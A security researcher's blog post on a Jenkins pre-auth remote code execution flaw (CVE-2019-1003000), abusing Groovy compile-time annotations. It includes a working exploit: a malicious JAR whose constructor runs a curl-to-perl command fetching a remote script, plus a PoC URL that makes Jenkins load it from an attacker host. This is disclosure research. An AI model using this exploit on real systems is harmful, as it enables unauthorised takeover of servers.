---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/
title: "Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE! | Orange Tsai"
author: "Orange Tsai"
published: 2019-02-18T16:00:00.000Z
description: "📌 [ 繁體中文 | English ] ChangeLog: 2019-02-22 updated 2019-05-10 updated 2019-05-10 released exploit code awesome-jenkins-rce-2019 2019-07-02 the slides is out! Hello everyone! This is the"
---

* * *

📌 \[ [繁體中文](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/) \| [English](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/#) \]

![preview](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/73138d7000a0a22d-01.png)

ChangeLog:

- 2019-02-22 [updated](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/#2019-02-22-updated)
- 2019-05-10 [updated](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/#2019-05-10-updated)
- 2019-05-10 released exploit code [awesome-jenkins-rce-2019](https://github.com/orangetw/awesome-jenkins-rce-2019)
- 2019-07-02 [the slides is out!](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/#2019-07-02-updated)

* * *

Hello everyone!

This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!

- [Hacking Jenkins Part 1 - Play with Dynamic Routing](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)

As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the [Script Console](http://jenkins.local/script))! Although we could bypass the first ACL, we still can’t do much things :(

After Jenkins released the [Security Advisory](https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595) and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)

# [Vulnerability Analysis](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#Vulnerability-Analysis "Vulnerability Analysis") Vulnerability Analysis

First, we start from the Jenkins Pipeline to explain [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)

In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it’s too tough. So the easiest way is to reuse existing function and library!

As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>``` | ```<br>public JSON doCheckScriptCompile(@QueryParameter String value) {<br>    try {<br>        CpsGroovyShell trusted = new CpsGroovyShellFactory(null).forTrusted().build();<br>        new CpsGroovyShellFactory(null).withParent(trusted).build().getClassLoader().parseClass(value);<br>    } catch (CompilationFailedException x) {<br>        return JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray());<br>    }<br>    return CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON();<br>    // Approval requirements are managed by regular stapler form validation (via doCheckScript)<br>}<br>``` |

Here Jenkins validates the Pipeline with the method [GroovyClassLoader.parseClass(…)](http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-)! It should be noted that this is just an AST parsing. Without running `execute()` method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>this.class.classLoader.parseClass('''<br>print java.lang.Runtime.getRuntime().exec("id")<br>''');<br>``` |

From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any `execute()` method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!

# [What is Meta-Programming](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#What-is-Meta-Programming "What is Meta-Programming") What is Meta-Programming

Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!

If it is still hard to understand, you can just regard `eval(...)` as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:

- C Macro
- C++ Template
- Java Annotation
- Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)
- DSL(Domain Specific Languages, such as [Sinatra](http://sinatrarb.com/) and [Gradle](https://gradle.org/))

When we are talking about Meta-Programming, we classify it into **(1)compile-time** and **(2)run-time Meta-Programming** according to the scope. Today, we focus on the compile-time Meta-Programming!

_P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! [Wiki](https://en.wikipedia.org/wiki/Metaprogramming), [Ref1](https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561), [Ref2](http://cs.lmu.edu/~ray/notes/metaprogramming/)_

_P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me <(\_ \_)>_

# [How to Exploit?](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#How-to-Exploit "How to Exploit?") How to Exploit?

From the previous section we know Jenkins validates Pipeline by [parseClass(…)](http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-) and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?

There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as he macro expansion in C language:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```<br>#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1<br>#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a<br>#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b<br>#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c<br>#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d<br>#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e<br>__int128 x[]={f,f,f,f,f,f,f,f};<br>``` |

or the compiler resource bomb(make a 16GB ELF by just 18 bytes):

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>int main[-1u]={1};<br>``` |

or calculating the Fibonacci number by compiler

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>``` | ```<br>template<int n><br>struct fib {<br>    static const int value = fib<n-1>::value + fib<n-2>::value;<br>};<br>template<> struct fib<0> { static const int value = 0; };<br>template<> struct fib<1> { static const int value = 1; };<br>int main() {<br>    int a = fib<10>::value; // 55<br>    int b = fib<20>::value; // 6765<br>    int c = fib<40>::value; // 102334155<br>}<br>``` |

From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>``` | ```<br>$ g++ template.cpp -o template<br>$ objdump -M intel -d template<br>...<br>00000000000005fa <main>:<br> 5fa:   55                      push   rbp<br> 5fb:   48 89 e5                mov    rbp,rsp<br> 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR [rbp-0xc],0x37<br> 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR [rbp-0x8],0x1a6d<br> 60c:   c7 45 fc cb 7e 19 06    mov    DWORD PTR [rbp-0x4],0x6197ecb<br> 613:   b8 00 00 00 00          mov    eax,0x0<br> 618:   5d                      pop    rbp<br> 619:   c3                      ret<br> 61a:   66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]<br>...<br>``` |

For more examples, you can refer to the article [Build a Compiler Bomb](https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb) on StackOverflow!

## [First Attempt](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#First-Attempt "First Attempt") First Attempt

Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official [Meta-Programming manual](http://groovy-lang.org/metaprogramming.html) to find some exploitation ways. In the section 2.1.9, we found the `@groovy.transform.ASTTest` annotation. Here is its description:

> `@ASTTest` is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and **perform assertions on the AST** rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. `@ASTTest` can be placed on any annotable node and requires two parameters:

What! **perform assertions on the AST**? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>this.class.classLoader.parseClass('''<br>@groovy.transform.ASTTest(value={<br>    assert java.lang.Runtime.getRuntime().exec("touch pwned")<br>})<br>def x<br>''');<br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>$ ls<br>poc.groovy<br>$ groovy poc.groovy<br>$ ls<br>poc.groovy  pwned<br>``` |

Cool, it works! However, while reproducing this on the remote Jenkins, it shows:

> unable to resolve class org.jenkinsci.plugins.workflow.libs.Library

![](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/222fd717701e01f1-02.png)

What the hell!!! What’s wrong with that?

With a little bit digging, we found the root cause. This is caused by the [Pipeline Shared Groovy Libraries Plugin](https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin)! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error `unsable to resolve class` occurs!

How to fix this problem? It’s simple! Just go to [Jenkins Plugin Manager](http://jenkins.local/pluginManager/) and remove the [Pipeline Shared Groovy Libraries Plugin](https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin)! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!

## [Second Attempt](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#Second-Attempt "Second Attempt") Second Attempt

We continue reading the [Groovy Meta-Programming manual](http://groovy-lang.org/metaprogramming.html) and found another interesting annotation - `@Grab`. There is no detailed information about `@Grab` on the manual. However, we found another article - [Dependency management with Grape](http://docs.groovy-lang.org/latest/html/documentation/grape.html) on search engine!

Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>@Grab(group='org.springframework', module='spring-orm', version='3.2.5.RELEASE')<br>import org.springframework.jdbc.core.JdbcTemplate<br>``` |

By using `@Grab` annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the [PoC](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc) proveded by [@adamyordan](https://github.com/adamyordan) to execute arbitrary commands!

However, without a valid credential and `execute()` method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about `@Grab`, we found another interesting annotation - `@GrabResolver`:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>@GrabResolver(name='restlet', root='http://maven.restlet.org/')<br>@Grab(group='org.restlet', module='org.restlet', version='1.1.6')<br>import org.restlet<br>``` |

If you are smart enough, you would like to change the `root` parameter to a malicious website! Let’s try this in local environment:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>this.class.classLoader.parseClass('''<br>@GrabResolver(name='restlet', root='http://orange.tw/')<br>@Grab(group='org.restlet', module='org.restlet', version='1.1.6')<br>import org.restlet<br>''')<br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] "HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1" 404 185 "-" "Apache Ivy/2.4.0"<br>``` |

Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?

# [The Way to Code Execution](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#The-Way-to-Code-Execution "The Way to Code Execution") The Way to Code Execution

In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?

By diving into [Grape implementation on Groovy](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java), we realized the library fetching is done by the class [groovy.grape.GrapeIvy](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy)! We started to find is there any way we can leverage, and we noticed an interesting method [processOtherServices(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312)!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>``` | ```<br>void processOtherServices(ClassLoader loader, File f) {<br>    try {<br>        ZipFile zf = new ZipFile(f)<br>        ZipEntry serializedCategoryMethods = zf.getEntry("META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods")<br>        if (serializedCategoryMethods != null) {<br>            processSerializedCategoryMethods(zf.getInputStream(serializedCategoryMethods))<br>        }<br>        ZipEntry pluginRunners = zf.getEntry("META-INF/services/org.codehaus.groovy.plugins.Runners")<br>        if (pluginRunners != null) {<br>            processRunners(zf.getInputStream(pluginRunners), f.getName(), loader)<br>        }<br>    } catch(ZipException ignore) {<br>        // ignore files we can't process, e.g. non-jar/zip artifacts<br>        // TODO log a warning<br>    }<br>}<br>``` |

JAR file is just a subset of ZIP format. In the [processOtherServices(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312), Grape registers servies if there are some specified entry points. Among them, the `Runner` interests me. By looking into the implementation of [processRunners(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335), we found this:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>void processRunners(InputStream is, String name, ClassLoader loader) {<br>    is.text.readLines().each {<br>        GroovySystem.RUNNER_REGISTRY[name] = loader.loadClass(it.trim()).newInstance()<br>    }<br>}<br>``` |

Here we see the `newInstance()`. Does it mean that we can call `Constructor` on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file `META-INF/services/org.codehaus.groovy.plugins.Runners` and we can invoke the `Constructor` and execute arbitrary code!

Here is the full exploit:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>``` | ```<br>public class Orange {<br>    public Orange(){<br>        try {<br>            String payload = "curl orange.tw/bc.pl | perl -";<br>            String[] cmds = {"/bin/bash", "-c", payload};<br>            java.lang.Runtime.getRuntime().exec(cmds);<br>        } catch (Exception e) { }<br>    }<br>}<br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>``` | ```<br>$ javac Orange.java<br>$ mkdir -p META-INF/services/<br>$ echo Orange > META-INF/services/org.codehaus.groovy.plugins.Runners<br>$ find .<br>./Orange.java<br>./Orange.class<br>./META-INF<br>./META-INF/services<br>./META-INF/services/org.codehaus.groovy.plugins.Runners<br>$ jar cvf poc-1.jar ./Orange.class /META-INF/<br>$ cp poc-1.jar ~/www/tw/orange/poc/1/<br>$ curl -I http://[your_host]/tw/orange/poc/1/poc-1.jar<br>HTTP/1.1 200 OK<br>Date: Sat, 02 Feb 2019 11:10:55 GMT<br>...<br>``` |

#### [PoC:](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#PoC "PoC:")**PoC:**

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile<br>?value=<br>@GrabConfig(disableChecksums=true)%0a<br>@GrabResolver(name='orange.tw', root='http://[your_host]/')%0a<br>@Grab(group='tw.orange', module='poc', version='1')%0a<br>import Orange;<br>``` |

#### [Video:](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#Video "Video:")**Video:**

Jenkins pre-auth remote code execution! - YouTube

Tap to unmute

[Jenkins pre-auth remote code execution!](https://www.youtube.com/watch?v=abuH-j-6-s0) [Orange Tsai](https://www.youtube.com/channel/UCnweRFxfA-xpTbkb83yfBog)

Orange Tsai3.75K subscribers

[Watch on](https://www.youtube.com/watch?v=abuH-j-6-s0)

# [Epilogue](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#Epilogue "Epilogue") Epilogue

With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox( [Script Security Plugin](https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin)) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!

Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected! It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points `doCheckScriptCompile(...)` and `toJson(...)` I reported, after the vulnerability has been fixed, [Mikhail Egorov](https://twitter.com/0ang3el) also found another [entry point](https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292) quickly to trigger this vulnerability!

Apart from that, this vulnerability can also be chained with my previous exploit on [Hacking Jenkins Part 1](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html) to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P

Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)

# [Updates](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#Updates "Updates") Updates

#### [2019/07/02 updated](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#2019-07-02-updated "2019/07/02 updated") 2019/07/02 updated

Twitter Embed

> My slides "Hacking Jenkins" for [#pts19](https://twitter.com/hashtag/pts19?src=hash&ref_src=twsrc%5Etfw) and [#HITBAMS](https://twitter.com/hashtag/HITBAMS?src=hash&ref_src=twsrc%5Etfw) is out! This is my first time to go French and Pass the SALT( [@passthesaltcon](https://twitter.com/passthesaltcon?ref_src=twsrc%5Etfw)) is such a really really good and interesting conference! [https://t.co/S4VUf3k1Zq](https://t.co/S4VUf3k1Zq)
>
> — Orange Tsai 🍊 (@orange\_8361) [July 3, 2019](https://twitter.com/orange_8361/status/1146364203390947330?ref_src=twsrc%5Etfw)

#### [2019/05/10 updated](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#2019-05-10-updated "2019/05/10 updated") 2019/05/10 updated

Twitter Embed

[Visit this post on X](https://twitter.com/orange_8361/status/1126829648552312832?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

[![](https://pbs.twimg.com/profile_images/863293355819585536/R2uVIB80_normal.jpg)](https://twitter.com/orange_8361?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

[Orange Tsai ![🍊](https://abs-0.twimg.com/emoji/v2/svg/1f34a.svg)](https://twitter.com/orange_8361?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

[@orange\_8361](https://twitter.com/orange_8361?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

·

[Follow](https://twitter.com/intent/follow?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F&screen_name=orange_8361)

[View on X](https://twitter.com/orange_8361/status/1126829648552312832?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

"There is no pre-auth RCE in Jenkins since May 2017, but this is the one!"
Relase a more reliable and elegant exploit - "awesome-jenkins-rce-2019" from my [#HITB2019AMS](https://twitter.com/hashtag/HITB2019AMS?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F&src=hashtag_click) talk. Thanks [@0ang3el](https://twitter.com/0ang3el?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F) and [@webpentest](https://twitter.com/webpentest?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F) join this party! [https://github.com/orangetw/awesome-jenkins-rce-2019…](https://github.com/orangetw/awesome-jenkins-rce-2019)

[![Image](https://pbs.twimg.com/media/D6NNidgWAAAgJIK?format=png&name=small)](https://x.com/orange_8361/status/1126829648552312832/photo/1)

[![Image](https://pbs.twimg.com/media/D6NNjYIW4AAE-TG?format=png&name=360x360)](https://x.com/orange_8361/status/1126829648552312832/photo/1)

[![Image](https://pbs.twimg.com/media/D6NNkEYWwAE8Qn9?format=png&name=360x360)](https://x.com/orange_8361/status/1126829648552312832/photo/1)

[12:41 PM · May 10, 2019](https://twitter.com/orange_8361/status/1126829648552312832?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

[X Ads info and privacy](https://help.twitter.com/en/twitter-for-websites-ads-info-and-privacy)

[511](https://twitter.com/intent/like?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F&tweet_id=1126829648552312832) [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F&in_reply_to=1126829648552312832)

Copy link

[Read 3 replies](https://twitter.com/orange_8361/status/1126829648552312832?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1126829648552312832%7Ctwgr%5Ed586b54eb9cad52749d59556e84a8e2564370a12%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fblog.orange.tw%2Fposts%2F2019-02-abusing-meta-programming-for-unauthenticated-rce%2F)

> "There is no pre-auth RCE in Jenkins since May 2017, but this is the one!"
>
> Relase a more reliable and elegant exploit - "awesome-jenkins-rce-2019" from my [#HITB2019AMS](https://twitter.com/hashtag/HITB2019AMS?src=hash&ref_src=twsrc%5Etfw) talk. Thanks [@0ang3el](https://twitter.com/0ang3el?ref_src=twsrc%5Etfw) and [@webpentest](https://twitter.com/webpentest?ref_src=twsrc%5Etfw) join this party! [https://t.co/qQCY2RYDa8](https://t.co/qQCY2RYDa8) [pic.twitter.com/sW0S7bctGT](https://t.co/sW0S7bctGT)
>
> — Orange Tsai 🍊 (@orange\_8361) [May 10, 2019](https://twitter.com/orange_8361/status/1126829648552312832?ref_src=twsrc%5Etfw)

#### [2019/02/22 updated](https://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/\#2019-02-22-updated "2019/02/22 updated") 2019/02/22 updated

Twitter Embed

> Some tips to make the exploit more reliable!
>
> 1\. Check your Java(JAR) version first!
>
> 2\. There are more than 3 entry points to trigger this vulnerability!
>
> 3\. Sometimes, the \`Grab\` failed but the \`ASTTest\` work perfectly! [https://t.co/NcTFyNIcHR](https://t.co/NcTFyNIcHR)
>
> — Orange Tsai 🍊 (@orange\_8361) [February 22, 2019](https://twitter.com/orange_8361/status/1098832738474283008?ref_src=twsrc%5Etfw)

Twitter Widget Iframe